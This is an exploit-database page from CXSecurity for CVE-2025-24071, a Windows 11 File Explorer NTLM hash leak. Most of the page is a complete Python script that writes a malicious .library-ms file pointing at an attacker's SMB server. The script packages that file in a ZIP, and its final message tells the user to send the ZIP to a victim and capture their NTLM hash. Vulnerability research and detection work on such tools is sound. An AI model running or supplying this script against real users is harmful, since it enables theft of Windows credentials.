---
title: Windows File Explorer Windows 11 (23H2) NTLM Hash Disclosure
url: https://cxsecurity.com/issue/WLB-2025060023
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-06-21
fetch_date: 2025-10-06T22:52:12.381055
---

# Windows File Explorer Windows 11 (23H2) NTLM Hash Disclosure

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Windows File Explorer Windows 11 (23H2) NTLM Hash Disclosure** **2025.06.20**  Credit:  **[Mohammed Idrees Banyamer](https://cxsecurity.com/author/Mohammed%2BIdrees%2BBanyamer/1/)**  Risk: **High**  Local: ****Yes****  Remote: **No**  CVE: **[CVE-2025-24071](https://cxsecurity.com/cveshow/CVE-2025-24071/ "Click to see CVE-2025-24071")**  CWE: **N/A** | |

#!/usr/bin/env python3
# Exploit Title: Windows File Explorer Windows 11 (23H2) - NTLM Hash Disclosure
# Exploit Author: Mohammed Idrees Banyamer
# Twitter/GitHub:https://github.com/mbanyamer
# Date: 2025-05-27
# CVE: CVE-2025-24071
# Vendor: Microsoft
# Affected Versions: Windows 10/11 (All supporting .library-ms and SMB)
# Tested on: Windows 11 (23H2)
# Type: Local / Remote (NTLM Leak)
# Platform: Windows
# Vulnerability Type: Information Disclosure
# Description:
# Windows Explorer automatically initiates an SMB authentication request when a
# .library-ms file is extracted from a ZIP archive. This causes NTLM credentials
# (in hashed format) to be leaked to a remote SMB server controlled by the attacker.
# No user interaction is required beyond extraction.
import zipfile
from pathlib import Path
import argparse
import re
import sys
from colorama import Fore, Style
def create\_library\_ms(ip: str, filename: str, output\_dir: Path) -> Path:
"""Creates a malicious .library-ms file pointing to an attacker's SMB server."""
payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\\\{ip}\\shared</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>'''
output\_file = output\_dir / f"{filename}.library-ms"
output\_file.write\_text(payload, encoding="utf-8")
return output\_file
def build\_zip(library\_file: Path, output\_zip: Path):
"""Packages the .library-ms file into a ZIP archive."""
with zipfile.ZipFile(output\_zip, 'w', zipfile.ZIP\_DEFLATED) as archive:
archive.write(library\_file, arcname=library\_file.name)
print(f"{Fore.GREEN}[+] Created ZIP: {output\_zip}{Style.RESET\_ALL}")
def is\_valid\_ip(ip: str) -> bool:
return re.match(r"^\d{1,3}(\.\d{1,3}){3}$", ip) is not None
def main():
parser = argparse.ArgumentParser(
description="CVE-2025-24071 - NTLM Hash Disclosure via .library-ms ZIP Archive",
epilog="example:\n python3 CVE-2025-24071\_tool.py -i 192.168.1.100 -n payload1 -o ./output\_folder --keep",
formatter\_class=argparse.RawTextHelpFormatter
)
parser.add\_argument("-i", "--ip", required=True, help="Attacker SMB IP address (e.g., 192.168.1.100)")
parser.add\_argument("-n", "--name", default="malicious", help="Base filename (default: malicious)")
parser.add\_argument("-o", "--output", default="output", help="Output directory (default: ./output)")
parser.add\_argument("--keep", action="store\_true", help="Keep .library-ms file after ZIP creation")
args = parser.parse\_args()
if not is\_valid\_ip(args.ip):
print(f"{Fore.RED}[!] Invalid IP address: {args.ip}{Style.RESET\_ALL}")
sys.exit(1)
output\_dir = Path(args.output)
output\_dir.mkdir(parents=True, exist\_ok=True)
print(f"{Fore.CYAN}[\*] Generating malicious .library-ms file...{Style.RESET\_ALL}")
library\_file = create\_library\_ms(args.ip, args.name, output\_dir)
zip\_file = output\_dir / f"{args.name}.zip"
build\_zip(library\_file, zip\_file)
if not args.keep:
library\_file.unlink()
print(f"{Fore.YELLOW}[-] Removed intermediate .library-ms file{Style.RESET\_ALL}")
print(f"{Fore.MAGENTA}[!] Done. Send ZIP to victim and listen for NTLM hash on your SMB server.{Style.RESET\_ALL}")
if \_\_name\_\_ == "\_\_main\_\_":
main()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025060023)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top